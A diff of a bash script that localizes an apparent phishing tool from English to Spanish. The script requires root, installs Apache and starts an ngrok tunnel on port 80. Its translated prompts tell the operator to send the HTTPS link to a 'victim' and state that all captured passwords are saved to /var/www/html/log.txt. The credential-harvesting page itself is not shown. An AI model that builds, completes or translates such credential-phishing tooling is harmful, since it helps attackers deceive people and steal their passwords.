@@ -1,8 +1,8 @@
 #!/bin/bash 
  cat Launch.txt
 sleep 4
- echo -e "\e[1;31m REQUIREMENT : ROOT! INTERNET! APACHE SERVER! \e[0m" 
- echo -e "\e[1;37m                   Devolopers assume no liability and are not Responsible! \e[0m"
+ echo -e "\e[1;31m REQUISITOS: ¡ROOT! ¡INTERNET! ¡SERVIDOR APACHE! \e[0m"
+ echo -e "\e[1;37m                   ¡Los desarrolladores no asumen ninguna responsabilidad y no son responsables! \e[0m"
 
 
 
@@ -37,7 +37,7 @@ yellow='\e[1;33m'
    echo""
 
 
-                echo -e $green "Enter Ngrok Path (ex. /root/)"
+                echo -e $green "Ingresar la ruta de Ngrok (p. ej. /root/)"
                 read $Path
                 sudo apt-get install apache2
 	        hostnamectl
@@ -58,8 +58,8 @@ yellow='\e[1;33m'
 		sleep 6
 		
 		
-		printf "                                \e[210m\e[1;99m ALERT +++++++++++++++++++++ Step 1 - Send Https Link on Victim +++++++++++ \e[0m\n"
-		printf "                                \e[210m\e[1;99m ALERT +++++++++++++++++++++ Step 2 - All Password save on /var/www/html/log.txt ++++++++++++++ \e[0m\n"
+		printf "                                \e[210m\e[1;99m ALERTA +++++++++++++++++++++ Paso 1: Enviar enlace Https a la víctima +++++++++++ \e[0m\n"
+		printf "                                \e[210m\e[1;99m ALERTA +++++++++++++++++++++ Paso 2: Todas las contraseñas se guardan en /var/www/html/log.txt ++++++++++++++ \e[0m\n"
 		sleep 11
 		cd $Path
                 gnome-terminal -x bash -c "./ngrok http 80; exec bash"
